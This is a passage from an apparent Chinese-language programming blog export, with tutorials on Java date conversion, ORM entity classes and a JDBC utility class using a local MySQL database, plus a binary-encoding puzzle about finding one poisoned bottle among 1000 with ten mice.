-&gt; java.sql.Date : &quot;</span> + jsd);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        java.util.Date jt = new java.util.Date();</span><br><span class="hljs-comment">        java.sql.Date jst = new java.sql.Date(jt.getTime());</span><br><span class="hljs-comment">        System.out.println(&quot;java.util.Date -&gt; java.sql.Date : &quot; + jst);</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">//将当前系统时间转换为sql.Date</span><br>        System.out.println(<span class="hljs-string">&quot;java.util.Date -&gt; java.sql.Date : &quot;</span> + <span class="hljs-keyword">new</span> java.sql.Date(<span class="hljs-keyword">new</span> java.util.Date().getTime()));<br>    &#125;<br><br><span class="hljs-comment">//输出</span><br>系统当前时间为：Thu Aug <span class="hljs-number">12</span> <span class="hljs-number">23</span>:<span class="hljs-number">52</span>:<span class="hljs-number">28</span> CST <span class="hljs-number">2021</span><br>String -&gt; java.util.Date : Thu Jul <span class="hljs-number">13</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> CST <span class="hljs-number">2000</span><br>java.util.Date -&gt; java.sql.Date : <span class="hljs-number">2000</span>-<span class="hljs-number">07</span>-<span class="hljs-number">13</span><br>java.util.Date -&gt; java.sql.Date : <span class="hljs-number">2021</span>-08-<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><h3 id="4-DateUtils工具类"><a href="#4-DateUtils工具类" class="headerlink" title="4.DateUtils工具类"></a>4.DateUtils工具类</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest;<br><br><span class="hljs-keyword">import</span> java.text.ParseException;<br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/12 23:57</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DateUtils</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>);<br>    <span class="hljs-comment">//1. String -&gt; java.util.Date</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.util.<span class="hljs-function">Date <span class="hljs-title">strToutil</span><span class="hljs-params">(String str)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> sdf.parse(str);<br>        &#125; <span class="hljs-keyword">catch</span> (ParseException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-comment">//2. java.util.Date -&gt; String</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">utilTostr</span><span class="hljs-params">(java.util.Date jud)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> sdf.format(jud);<br>    &#125;<br>    <span class="hljs-comment">//3. java.util.Date -&gt; java.sql.Date</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.sql.<span class="hljs-function">Date <span class="hljs-title">utilTosql</span><span class="hljs-params">(java.util.Date jud)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> java.sql.Date(jud.getTime());<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（五）ORM(entity实体类)</title>
    <link href="/2021/08/12/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%94%EF%BC%89ORM(entity%E5%AE%9E%E4%BD%93%E7%B1%BB)/"/>
    <url>/2021/08/12/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%94%EF%BC%89ORM(entity%E5%AE%9E%E4%BD%93%E7%B1%BB)/</url>
    
    <content type="html"><![CDATA[<p>ORM（object Relational Mapping）。它的作用是在关系型数据库和对象之间作一个映射，这样，在具体的操作数据库的时候，就不需要再去和复杂的SQL语句打交道，只要像平时操作对象一样操作它就可以了 。ORM就是通过实例对象的语法，完成关系型数据库的操作的技术，是”对象-关系映射”（Object/Relational Mapping） 的缩写。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-实体类（entity）"><a href="#1-实体类（entity）" class="headerlink" title="1.实体类（entity）"></a>1.实体类（entity）</h3><p>ORM 把数据库映射成对象。</p><ul><li>数据库的表（table） –&gt; 类（class）</li><li>记录（record，行数据）–&gt; 对象（object）</li><li>字段（field）–&gt; 对象的属性（attribute）</li></ul><p>通过entity的规则对表中的数据进行对象的封装。<br>表名=类名；列名=属性名；再提供各个属性的 get 、 set 方法。提供无参（有参）构造方法。</p><p>实例：</p><p>数据库对应类：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/12 22:54</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Te</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> money;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Te</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Te</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, String name, <span class="hljs-keyword">int</span> money)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.money = money;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMoney</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> money;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMoney</span><span class="hljs-params">(<span class="hljs-keyword">int</span> money)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.money = money;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Te&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, money=&quot;</span> + money +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>主函数：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.PreparedStatement;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/12 14:53</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestMain</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Connection con = MoreMove.getConnection();<br>        PreparedStatement ps = con.prepareStatement(<span class="hljs-string">&quot;select * from Te&quot;</span>);<br>        ResultSet rs = ps.executeQuery();<br>        List&lt;Te&gt; lte = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>        <span class="hljs-keyword">while</span>(rs.next())&#123;<br>            <span class="hljs-keyword">int</span> s1 = rs.getInt(<span class="hljs-number">1</span>);<br>            String s2 = rs.getString(<span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">int</span> s3 = rs.getInt(<span class="hljs-number">3</span>);<br>            Te te = <span class="hljs-keyword">new</span> Te();<br>            te.setId(s1);<br>            te.setName(s2);<br>            te.setMoney(s3);<br>            lte.add(te);<br>        &#125;<br>        MoreMove.closeAll(con,ps,rs);<br><br>        <span class="hljs-keyword">for</span>(Te it : lte)&#123;<br>            System.out.println(it);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出结果</span><br>Te&#123;id=<span class="hljs-number">123</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">234</span>, name=<span class="hljs-string">&#x27;loong&#x27;</span>, money=<span class="hljs-number">234</span>&#125;<br>Te&#123;id=<span class="hljs-number">423</span>, name=<span class="hljs-string">&#x27;wer&#x27;</span>, money=<span class="hljs-number">54</span>&#125;<br>Te&#123;id=<span class="hljs-number">434</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">908</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">4234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">4349</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">42234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br>Te&#123;id=<span class="hljs-number">422234</span>, name=<span class="hljs-string">&#x27;qqewr&#x27;</span>, money=<span class="hljs-number">34</span>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-用小白鼠找毒药</title>
    <link href="/2021/08/12/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E7%94%A8%E5%B0%8F%E7%99%BD%E9%BC%A0%E6%89%BE%E6%AF%92%E8%8D%AF/"/>
    <url>/2021/08/12/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E7%94%A8%E5%B0%8F%E7%99%BD%E9%BC%A0%E6%89%BE%E6%AF%92%E8%8D%AF/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>有1000瓶水，其中有一瓶有毒，小白鼠只要尝一点带毒的水24小时后就会死亡，给你24小时时间，至少要多少只小白鼠才可以试出哪瓶有毒？</p><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>10只。（1000（1111101000），1000的二进制位有10位数字。）</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这是一个二进制的问题，利用二进制的位数进行统计。首先2<sup>10</sup> = 1024 &gt; 1000，所以需要10位二进制位来表示1到1000。</p><p>给1000瓶水分别标号1-1000。再将其十进制数字转化为二进制，如下：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000001 （第1瓶） <br>0000000010 （第2瓶） <br>0000000011 （第3瓶） <br>...... <br>1111101000 （第1000瓶） <br></code></pre></div></td></tr></table></figure><p>再去找每一瓶水的标号的二进制位中有为1的位置（从右向左以1开始），如下：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000001 （第1瓶） 1<br>0000000010 （第2瓶） 2<br>0000000011 （第3瓶） 1 2<br>...... <br>1111101000 （第1000瓶） 4 6 7 8 9 10<br></code></pre></div></td></tr></table></figure><p>即，第一瓶给编号为1的老鼠喝，第二瓶给编号为2的老鼠喝，第三瓶给编号为1、2的老鼠喝，··· 第1000瓶给编号为4、6、7、8、9、10的老鼠喝。喝了白水再喝毒水或者喝了毒水再喝白水是对最后结果没有影响的。<br>因为瓶的标号的二进制是从右向左开始计数的，所以老鼠的编号也应该从右向左排，即从10号排到1号，即：10 9 8 7 … 2 1。（因为10只老鼠就相当于是一个10位的二进制位，每一只老鼠是一个二进制位。）</p><p>在24小时后，查看10只老鼠的情况，<code>死的表示为1</code>，<code>活着的表示为0</code>。</p><p>假如：有毒的水为瓶标号为5号。则10只老鼠的情况为：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">老鼠编号 10 9 8 7 6 5 4 3 2 1<br>         0 0 0 0 0 0 0 1 0 1<br></code></pre></div></td></tr></table></figure><p>将其二进制转化为10进制后即为答案5。</p><p>因为瓶标号为5（0000000101）的水会给1、3号老鼠喝，而喝完24小时后老鼠会死亡，而其他老鼠喝其他的没有影响。</p><p>同理：如果有毒的水为瓶标号为1000号。则10只老鼠的情况为：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">老鼠编号 10 9 8 7 6 5 4 3 2 1<br>         1 1 1 1 1 0 1 0 0 0<br></code></pre></div></td></tr></table></figure><p>将其二进制转化为10进制后即为答案1000。</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试题</tag>
      
      <tag>思维题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（四）JDBC封装工具类</title>
    <link href="/2021/08/11/JavaWEB/JavaWEB-%EF%BC%88%E5%9B%9B%EF%BC%89JDBC%E5%B0%81%E8%A3%85%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    <url>/2021/08/11/JavaWEB/JavaWEB-%EF%BC%88%E5%9B%9B%EF%BC%89JDBC%E5%B0%81%E8%A3%85%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>每次操纵数据库都需要进行数据库的注册、连接等大量重复的操作，使得代码变得十分的臃肿，所以此时应该考虑如何把重复代码提取出来，随时需要随时拿来用。这就是工具类的封装。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-重用性"><a href="#1-重用性" class="headerlink" title="1.重用性"></a>1.重用性</h2><p>工具类 DoubleUse.java 内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.sql.*;<br><span class="hljs-keyword">import</span> java.util.Collection;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/11 14:53</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoubleUse</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">//获取连接数据库对象</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>&#123;<br>        Connection conn = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String url = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/WeekDay?serverTimezone=GMT%2B8&quot;</span>;<br>            String user = <span class="hljs-string">&quot;root&quot;</span>;<br>            String password = <span class="hljs-string">&quot;loong461&quot;</span>;<br>            conn = DriverManager.getConnection(url,user,password);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> conn;<br>    &#125;<br><br>  <span class="hljs-comment">//关闭函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement st, ResultSet rs)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(rs != <span class="hljs-keyword">null</span>)&#123;<br>                rs.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(st != <span class="hljs-keyword">null</span>)&#123;<br>                st.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>            &#125;<br><br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>主函数 内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.PreparedStatement;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/11 14:53</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestMain</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Connection con = DoubleUse.getConnection();<br>        PreparedStatement ps = con.prepareStatement(<span class="hljs-string">&quot;select * from Te&quot;</span>);<br>        ResultSet rs = ps.executeQuery();<br><br>        <span class="hljs-keyword">while</span>(rs.next())&#123;<br>            String s1 = rs.getString(<span class="hljs-number">1</span>);<br>            String s2 = rs.getString(<span class="hljs-number">2</span>);<br>            String s3 = rs.getString(<span class="hljs-number">3</span>);<br>            System.out.println(s1+<span class="hljs-string">&quot; | &quot;</span>+s2+<span class="hljs-string">&quot; | &quot;</span>+s3);<br>        &#125;<br><br>        DoubleUse.closeAll(con,ps,rs);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="2-跨平台性"><a href="#2-跨平台性" class="headerlink" title="2.跨平台性"></a>2.跨平台性</h2><p>使用配置文件。</p><p>src目录下的db.properties内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//src目录下的db.properties</span><br>driver = com.mysql.cj.jdbc.Driver<br>url = jdbc:mysql:<span class="hljs-comment">//localhost:3306/WeekDay?serverTimezone=GMT%2B8</span><br>user = root<br>password = loong461<br></code></pre></div></td></tr></table></figure><p>工具类 MoreMove.java 内容。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.sql.*;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/11 14:52</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MoreMove</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span 